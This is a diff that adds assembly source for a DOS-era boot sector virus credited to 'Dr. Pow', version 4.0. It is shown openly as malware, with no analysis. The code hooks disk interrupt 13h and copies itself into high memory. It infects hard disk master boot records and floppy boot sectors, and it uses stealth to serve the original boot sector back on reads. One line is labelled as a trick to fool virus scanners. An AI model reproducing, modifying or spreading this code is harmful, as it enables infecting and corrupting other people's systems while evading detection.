@@ -1,0 +1,112 @@
+;       ÕÍ ÄÄÍÍÄÄ ÄÄ ÄÍÄ ÄÄÍÍÍÍÍÍ ÍÍÄÄ ÍÍÄÍÄ  ÄÄÍÍÄÍÄúÄÍÍÄ-Ä ÄÄúÄÄÄÍÄ ÄÄ¿
+;       ³                      úBúOúOúTú úVúIúRúUúSú                    ³
+;       ³         Author:     Dr. Pow                                   ù
+;       .         Version:    4.0                                       ³
+;       |         Infection:  i13/ah=2,3/cx=0001/dh=00
+;                 Stealth:    i13/ah=2/cx=0001/dh=00                    ³
+;                 Size:       242 bytes                                 ³
+;       ³         Assembler:  A86v4.02                                  ³
+;       ÀÄ-ÍÍÍÍÄÄ ÄÄ ÄÍÍÍÄúÄÍÍ ÍÍÄÄ ÍÍÄÍÄ  ÄÄÍÍÄÍÄúÄÍÍÄ Ä  ÄÄúÄÄÄÍÄ ÄÄÄÄ¾
+
+		org     0
+
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
+
+		dw      3CEBh                   ; JMP  SHORT  003F
+		db      3Ch dup(0)
+
+		cli
+		xor     di, di
+		mov     ds, di
+		mov     ss, di
+		mov     sp, 7C00h
+
+		mov     si, 412h                ; "Fool the scanner" trick..
+		inc     si
+		dec     W [si]                  ; Allocate 1Kb memory
+		lodsw                           ; Get the top of memory
+		mov     cl, 6
+		shl     ax, cl                  ; Convert to para
+		mov     es, ax
+
+		cld
+		mov     si, sp                  ; SP=7C00
+		mov     cx, 0FEh
+		repz    movsw                   ; Move virus to TOM
+
+		mov     si, 13h*4
+		movsw                           ; Get i13 entry..
+		movsw
+		mov     W [si-4], offset Hand_13
+		mov     W [si-2], es
+
+		sti
+		int     19h                     ; Reload boot
+MyID            db      "-Pow-"
+
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
+
+ReadDisk:       mov     ax, 0201h
+		jmp     short  Do_13
+WriteDisk:      mov     ax, 0301h
+Do_13:          pushf
+		call    D cs:[1FCh]             ; Call i13
+		ret
+
+
+Hand_13:        mov     B cs:[Function+1], ah   ; Save function number
+		call    Do_13                   ; Do their INT
+		push    ax, cx, dx, si, di, es, bx
+		pushf
+
+Function:       mov     al, 00
+		dec     ax
+		dec     ax                      ; al=0(read), =1(write)
+		cmp     al, 1                   ; Write ?
+		ja      PopAllExit
+		cmp     cx, 1                   ; Cylinder 0, sector 1?
+		jnz     PopAllExit
+		or      dh, dh                  ; Head 0?
+		jnz     PopAllExit
+
+		push    ax, cs
+		pop     es
+		mov     bx, 200h
+		call    ReadDisk                ; Read boot to CS:0200
+		pop     ax
+		jb      PopAllExit              ; Error? Lets abort
+
+		inc     cx                      ; Hard disk MBR at 0/0/2
+		or      dl, dl
+		js      PosOK
+		mov     cl, 14                  ; Floppy boot at 0/1/14
+		mov     dh, 1
+
+PosOK:          cmp     W es:[bx+MyID], 'P-'    ; Am I home?
+		jnz     Infect                  ; No? I'm coming!
+		or      al, al                  ; Read function?
+		jnz     PopAllExit
+		popf
+		pop     bx, es
+		call    ReadDisk                ; Read orig boot in their buffer
+		jmp     short  PopDiExit
+
+Infect:         call    WriteDisk               ; Write orig boot
+		jb      PopAllExit              ; Error? Lets abort
+		mov     si, 3Eh
+		mov     di, 23Eh
+		mov     cl, 0DFh                ; Words to move
+		cld
+		rep     movsw  cs:              ; Move virus to our buffer
+		mov     W es:[bx], 3CEBh        ; Move JMP SHORT opcode
+		inc     cx                      ; CX=0001
+		mov     dh, 0
+		call    WriteDisk               ; Write back infected boot
+
+PopAllExit:     popf
+		pop     bx, es
+PopDiExit:      pop     di, si, dx, cx, ax
+		retf    0002o
+
+
+
